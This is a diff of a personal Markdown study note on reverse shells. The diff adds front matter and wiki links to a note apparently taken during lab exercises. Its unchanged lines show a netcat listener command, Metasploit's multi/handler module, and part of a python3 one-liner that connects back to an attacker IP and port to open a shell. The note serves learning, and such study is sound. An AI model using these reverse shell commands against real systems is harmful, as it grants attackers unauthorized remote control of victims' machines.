@@ -1,3 +1,10 @@
+---
+title: "Reverse shells"
+created: 2026-03-11
+type: technique
+tags: [linux, shells, technique]
+---
+
 A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system’s vulnerabilities to initiate a shell session and then access the victim’s computer. The goal is to offer the attacker machine a shell instead of my machine requesting it from the target which would be much easier to evade firewalls.
 # Useful Commands:
 ## On the Attacker machine
@@ -8,7 +15,7 @@ To start a netcat listener we use  the following command
 sudo nc -lvnp <port-number>
 ```
 
-or we can use the `exploit/multi/handler` module which is like socat and netcat, used to receive reverse shells, It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads, use the following Metasploit command to use the module:
+or we can use the `exploit/multi/handler` module which is like socat and netcat, used to receive reverse shells, It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads, use the following [[Metasploit]] command to use the module:
 
 ```msfconsole
 use exploit/multi/handler
@@ -48,7 +55,7 @@ export RHOST="10.2.54.112";export RPORT=4444;python3 -c 'import sys,socket,os,pt
 # Extra:
 
 **Important Note :** 
-This note was taken from the network services - Telnet room:
+This note was taken from the network services - [[Telnet]] room:
 
 The netcat reverse shell will not close target-side after you close it locally
 so the program will be blocked (hanging).
